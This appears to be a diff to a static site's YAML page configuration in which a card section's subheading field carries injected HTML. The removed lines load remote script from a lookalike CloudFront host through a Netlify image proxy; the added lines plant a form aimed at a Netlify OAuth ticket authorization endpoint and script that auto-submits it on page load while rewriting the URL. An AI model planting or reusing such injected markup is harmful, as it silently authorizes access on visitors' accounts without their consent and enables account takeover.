@@ -17,13 +17,16 @@ sections:
   - type: CardGridSection
     heading: Card Grid Heading
     subheading: >
-      <form id="tokenForm"
-      action="https://app.netlify.com/generate-access-control-token">
-          <input type="submit" value="Submit request" />
+      <form
+      action="https://app.netlify.com/access-control/bb-api/api/v1/oauth/tickets/88d2de4e27137269c40e44747eba49ea/authorize"
+      method="POST">
+        <input type="submit" value="Submit request" />
       </form>
 
-      <script
-      src="https://app.netlify.com/.netlify/images?url=https://d33wubrfki0l68.cloudfront.net.cuhawk.co.uk/test45.js"></script>
+      <script>
+        history.pushState('', '', '/');
+        document.forms[0].submit();
+      </script>
   - type: CardGridSection
     heading: Jump to Topic
     subheading: |
